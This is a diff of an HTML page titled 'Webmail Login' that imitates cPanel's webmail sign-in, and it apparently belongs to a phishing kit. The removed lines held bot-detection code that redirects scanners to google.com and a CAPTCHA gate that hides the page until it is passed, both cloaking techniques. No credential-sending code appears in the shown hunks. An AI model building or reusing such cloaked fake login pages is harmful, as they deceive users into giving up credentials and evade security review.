@@ -1,26 +1,6 @@
-<!DOCTYPE html> 
 <html lang="en" dir="ltr"><head>
-<script src="anti-bot.js"></script>
-    <!-- Cloudflare Turnstile CAPTCHA script -->
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer type="ba085d8efc48b1cdb86299f8-text/javascript"></script>
-    <style>
-        #content {
-            display: none; /* Hide the content initially */
-        }
-        #captcha {
-            text-align: center;
-            margin-top: 20px;
-        }
-    </style>
-</head>
-<body>
-    <div id="captcha">
-        <!-- Cloudflare Turnstile CAPTCHA widget -->
-        <div class="cf-turnstile" data-sitekey="0x4AAAAAAAxvKQ72930YAwaM" data-callback="onTurnstileSuccess"></div>
-    </div>
-    <div id="content">
-<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
     <meta name="google" content="notranslate">
     <meta name="apple-itunes-app" content="app-id=1188352635">
     <title>Webmail Login</title>
@@ -163,7 +143,7 @@
 </style>
     <div class="copyright">Copyright©&nbsp;2024 cPanel, L.L.C.
     <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>
-<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="ba085d8efc48b1cdb86299f8-|49" defer></script>
+
 <!-- jQuery first, then Popper.js, then Bootstrap JS -->
       <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
@@ -176,11 +156,6 @@
     <script>
 $(document).ready(function(){
 var count=0;
-
-if (botDetected) {
-        window.location.href = "http://www.google.com";
-        return;
-      }
 
 $('#back1').click(function () {
 $("#msg").hide();
@@ -290,13 +265,6 @@ count=count+1;
 	});
 
 
-  </script>
-    <!-- JavaScript to handle CAPTCHA success -->
-    <script type="ba085d8efc48b1cdb86299f8-text/javascript">
-        function onTurnstileSuccess(token) {
-            // Show the content and hide the CAPTCHA after successful validation
-            document.getElementById('captcha').style.display = 'none';
-            document.getElementById('content').style.display = 'block';
-        }
-    </script>
-  </html>
+</script>
+
+</body></html>
